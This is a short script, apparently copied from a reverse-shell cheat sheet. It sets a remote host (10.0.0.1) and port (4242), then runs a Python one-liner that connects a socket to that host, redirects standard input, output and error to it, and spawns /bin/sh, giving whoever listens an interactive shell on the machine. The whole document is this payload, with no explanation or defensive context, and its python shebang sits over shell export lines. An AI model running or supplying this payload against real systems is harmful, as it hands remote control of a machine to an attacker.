#!/usr/bin/env python
export RHOST="10.0.0.1";
export RPORT=4242;
python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'